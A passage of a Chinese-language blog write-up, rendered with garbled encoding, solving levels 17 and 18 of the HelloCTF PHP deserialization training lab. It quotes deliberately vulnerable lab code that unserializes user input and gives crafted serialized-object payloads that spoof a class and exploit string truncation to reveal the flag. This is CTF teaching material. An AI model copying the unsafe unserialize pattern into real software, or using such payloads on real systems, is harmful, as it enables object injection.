class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class A is NULL: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class B is a class with 3 properties: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="variable">$serliseString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After replace B with A,we unserialize it and dump :&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseString</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> A &amp;&amp; <span class="variable">$a</span>-&gt;helloctfcmd == <span class="string">&quot;get_flag&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s rule?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">Class A is <span class="literal">NULL</span>: <span class="string">&#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span></span><br><span class="line">Class B is a <span class="class"><span class="keyword">class</span> <span class="title">with</span> 3 <span class="title">properties</span>: &#x27;<span class="title">O</span>:1:&quot;<span class="title">B</span>&quot;:3:</span>&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Bc&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">After replace B with A,we unserialize it and dump :</span></span><br><span class="line"><span class="string">object(A)#1 (3) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;:protected]=&gt; string(3) &quot;CTF&quot; [&quot;c&quot;:&quot;A&quot;:private]=&gt; string(10) &quot;FLAG&#123;TEST&#125;&quot; &#125;</span></span><br></pre></td></tr></table></figure><p>ç”±hintï¼Œå½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¸ä¼šåšä»»ä½•æ£€æŸ¥</p><p>æ›´æ”¹Bçš„å±æ€§åå°†åç§°æ›¿æ¢ä¸ºAå³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;FLAG&#123;TEST&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$helloctfcmd</span>=<span class="string">&quot;get_flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>O:1:&quot;B&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code></p><p>ä¿®æ”¹ä¼ é€’<code>o=O:1:&quot;A&quot;:4:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:4:&quot; * b&quot;;s:3:&quot;CTF&quot;;s:4:&quot; B c&quot;;s:10:&quot;FLAG{TEST}&quot;;s:11:&quot;helloctfcmd&quot;;s:8:&quot;get_flag&quot;;}</code>å³å¯</p><br /><h3 id="ï¼ˆç‰¹æ€§ï¼‰Level-18-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š"><a href="#ï¼ˆç‰¹æ€§ï¼‰Level-18-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š" class="headerlink" title="ï¼ˆç‰¹æ€§ï¼‰Level 18: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š"></a>ï¼ˆç‰¹æ€§ï¼‰Level 18: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-å°¾éƒ¨åˆ¤å®š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 18 : å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è§„åˆ™ç‰¹æ€§,å­—ç¬¦ä¸²å°¾éƒ¨åˆ¤å®šï¼šè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå½“æˆå‘˜å±æ€§çš„æ•°é‡ï¼Œåç§°é•¿åº¦ï¼Œå†…å®¹é•¿åº¦å‡ä¸€è‡´æ—¶ï¼Œç¨‹åºä¼šä»¥ &quot;;&#125;&quot; ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“å°¾åˆ¤å®šã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;GET_FLAG&quot;;&#125;FAKE_FLAG&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringDemo</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$change</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;change&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$serliseStringFLAG</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$target</span>, <span class="variable">$change</span>, <span class="variable">$serliseStringDemo</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serliseStringFLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$FLAG</span> <span class="keyword">instanceof</span> FLAG &amp;&amp; <span class="variable">$FLAG</span>-&gt;key == <span class="string">&#x27;GET_FLAG&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">SerliseStringDemo:<span class="string">&#x27;O:4:&quot;Demo&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;&#125;FAKE_FLAG&quot;;&#125;&#x27;</span></span><br><span class="line">Change SOMETHING TO GET FLAGYour serliaze <span class="keyword">string</span> is O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;GET_FLAG&quot;</span>;&#125;FAKE_FLAG<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">And Here is object(Demo)#1 (3) &#123; [&quot;</span>a<span class="string">&quot;]=&gt; string(5) &quot;</span>Hello<span class="string">&quot; [&quot;</span>b<span class="string">&quot;]=&gt; string(3) &quot;</span>CTF<span class="string">&quot; [&quot;</span>key<span class="string">&quot;]=&gt; string(20) &quot;</span>GET_FLAG<span class="string">&quot;;&#125;FAKE_FLAG&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œæˆªæ–­ï¼Œåªéœ€è¦æŠŠå¯¹è±¡å<code>&quot;Demo&quot;</code>æ›¿æ¢ä¸º<code>&quot;FLAG&quot;</code>ï¼Œå­—ç¬¦æ•°<code>20</code>æ›¿æ¢ä¸º<code>8</code>å³å¯</p><p>ä¼ é€’<code>target=O:4:&quot;Demo&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:20:&quot;GET_FLAG&quot;;}FAKE_FLAG&quot;;}</code></p><p><code>&amp;change=O:4:&quot;FLAG&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;s:3:&quot;CTF&quot;;s:3:&quot;key&quot;;s:8:&quot;GET_FLAG&quot;;}</code></p><br />]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
